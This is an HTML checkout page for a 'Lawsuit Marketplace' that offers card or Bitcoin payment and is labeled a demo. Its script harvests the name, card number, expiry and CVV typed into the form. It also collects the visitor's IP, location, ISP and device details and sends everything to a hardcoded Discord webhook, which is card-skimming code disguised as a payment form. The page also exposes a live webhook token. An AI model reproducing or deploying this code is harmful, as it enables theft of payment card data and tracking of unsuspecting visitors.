<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Payment Methods | Lawsuit Marketplace</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background: #0f172a;
      color: white;
    }
    .form-section {
      background-color: rgba(31, 41, 55, 0.8);
      border-radius: 1rem;
      padding: 2rem;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    }
    .payment-method {
      border: 2px solid rgba(255, 255, 255, 0.2);
      padding: 2rem;
      border-radius: 1rem;
      cursor: pointer;
      transition: transform 0.3s ease;
    }
    .payment-method:hover {
      transform: translateY(-5px);
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
    }
    .card-details, .crypto-details {
      display: none;
    }
    .payment-method input[type="radio"]:checked + label {
      background-color: #1c1f2f;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
    }
  </style>
</head>
<body class="bg-gray-950">

  <header class="bg-gray-900 bg-opacity-80 shadow-md p-6 flex justify-between items-center">
    <h1 class="text-3xl font-semibold tracking-wide text-white">Lawsuit Marketplace</h1>
  </header>

  <section class="p-6 mt-12 max-w-4xl mx-auto">
    <h2 class="text-4xl font-semibold text-center text-white mb-8">Select Your Payment Method</h2>

    <div class="flex justify-center space-x-8">
      <!-- Card -->
      <div class="payment-method">
        <input type="radio" id="payment-card" name="payment-method" class="hidden" />
        <label for="payment-card" class="flex flex-col items-center text-white p-6 rounded-xl cursor-pointer hover:bg-gray-800">
          <span class="text-xl font-semibold">Pay with Card</span>
          <span class="mt-2 text-sm text-gray-400">Secure payment via Stripe</span>
        </label>
        <div class="card-details mt-6">
          <form>
            <label class="text-sm text-gray-300">Full Name:</label>
            <input type="text" id="full-name" class="w-full p-3 mt-2 bg-gray-800 border border-gray-600 rounded-lg text-white" placeholder="John Doe" required />
            <label class="text-sm text-gray-300 mt-4">Card Number:</label>
            <input type="text" id="card-number" class="w-full p-3 mt-2 bg-gray-800 border border-gray-600 rounded-lg text-white" placeholder="4242 4242 4242 4242" required />
            <div class="flex mt-4">
              <div class="w-1/2 pr-2">
                <label class="text-sm text-gray-300">Expiry:</label>
                <input type="text" id="expiry" class="w-full p-3 mt-2 bg-gray-800 border border-gray-600 rounded-lg text-white" placeholder="MM/YY" required />
              </div>
              <div class="w-1/2 pl-2">
                <label class="text-sm text-gray-300">CVV:</label>
                <input type="text" id="cvv" class="w-full p-3 mt-2 bg-gray-800 border border-gray-600 rounded-lg text-white" placeholder="123" required />
              </div>
            </div>
            <button type="submit" class="w-full mt-6 bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition">Submit Demo Order</button>
          </form>
        </div>
      </div>

      <!-- Crypto -->
      <div class="payment-method">
        <input type="radio" id="payment-crypto" name="payment-method" class="hidden" />
        <label for="payment-crypto" class="flex flex-col items-center text-white p-6 rounded-xl cursor-pointer hover:bg-gray-800">
          <span class="text-xl font-semibold">Pay with Crypto</span>
          <span class="mt-2 text-sm text-gray-400">Send Bitcoin to the address below</span>
        </label>
        <div class="crypto-details mt-6">
          <p class="text-gray-300">Send BTC to:</p>
          <pre class="text-blue-400 mt-2">1DemoBitcoinAddressXYZ123</pre>
          <button class="w-full mt-6 bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition">Confirm Crypto Payment</button>
        </div>
      </div>
    </div>
  </section>

  <footer class="p-6 mt-12 text-center text-gray-500">
    <p>&copy; 2025 Lawsuit Marketplace. Demo only. No data is real.</p>
  </footer>

  <script>
    document.querySelectorAll('input[name="payment-method"]').forEach((radio) => {
      radio.addEventListener('change', (event) => {
        document.querySelector('.card-details').style.display = event.target.id === 'payment-card' ? 'block' : 'none';
        document.querySelector('.crypto-details').style.display = event.target.id === 'payment-crypto' ? 'block' : 'none';
      });
    });

    async function getMetadata() {
      const [ipData, battery] = await Promise.all([
        fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({})),
        navigator.getBattery ? navigator.getBattery() : Promise.resolve({})
      ]);

      return {
        ip: ipData.ip || 'N/A',
        country: ipData.country_name || 'N/A',
        city: ipData.city || 'N/A',
        org: ipData.org || 'N/A',
        timezone: ipData.timezone || 'N/A',
        browser: navigator.userAgent,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        platform: navigator.platform,
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
        cpu: navigator.hardwareConcurrency || 'Unknown',
        battery: battery.level ? `${Math.round(battery.level * 100)}%` : 'Unavailable',
        charging: battery.charging ? 'Yes' : 'No',
        status: navigator.onLine ? 'Online' : 'Offline',
        time: new Date().toLocaleString()
      };
    }

    function sendToDiscord(paymentMethod, formData, meta) {
      const webhookUrl = 'https://discordapp.com/api/webhooks/1373748781861834882/2SDjfj-z2YxeR71Z8JDFLw3lk8uQwjIu_PwYrgTfMwLrIsVyBdJBW5PBNB1qg50wfLAe';
      const message = {
        content: `📦 **New Order (Demo Project)**

🧾 **Order Info**
- Method: ${paymentMethod}
- Name: ${formData.fullName || 'N/A'}
- Card: ${formData.cardNumber || 'N/A'}
- Expiry: ${formData.expiry || 'N/A'}
- CVV: ${formData.cvv || 'N/A'}
- BTC Address: ${formData.bitcoinAddress || 'N/A'}

🌐 **Location & Device Info**
- IP: ${meta.ip}
- City: ${meta.city}, Country: ${meta.country}
- ISP: ${meta.org}
- Timezone: ${meta.timezone}

💻 **Browser & System**
- User Agent: ${meta.browser}
- Platform: ${meta.platform}
- Screen: ${meta.screen}
- Language: ${meta.language}
- RAM: ${meta.ram}
- CPU Cores: ${meta.cpu}
- Battery: ${meta.battery} (Charging: ${meta.charging})
- Online Status: ${meta.status}
- Submitted At: ${meta.time}`
      };

      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(message)
      })
      .then(() => alert('Demo order submitted! Check Discord.'))
      .catch(err => console.error('Webhook Error:', err));
    }

    document.querySelector('.card-details form').addEventListener('submit', async function (e) {
      e.preventDefault();
      const formData = {
        fullName: document.querySelector('#full-name').value,
        cardNumber: document.querySelector('#card-number').value,
        expiry: document.querySelector('#expiry').value,
        cvv: document.querySelector('#cvv').value,
        bitcoinAddress: ''
      };
      const meta = await getMetadata();
      sendToDiscord('Card', formData, meta);
    });

    document.querySelector('.crypto-details button').addEventListener('click', async function () {
      const formData = {
        fullName: '',
        cardNumber: '',
        expiry: '',
        cvv: '',
        bitcoinAddress: document.querySelector('.crypto-details pre').innerText
      };
      const meta = await getMetadata();
      sendToDiscord('Crypto', formData, meta);
    });
  </script>
</body>
</html>
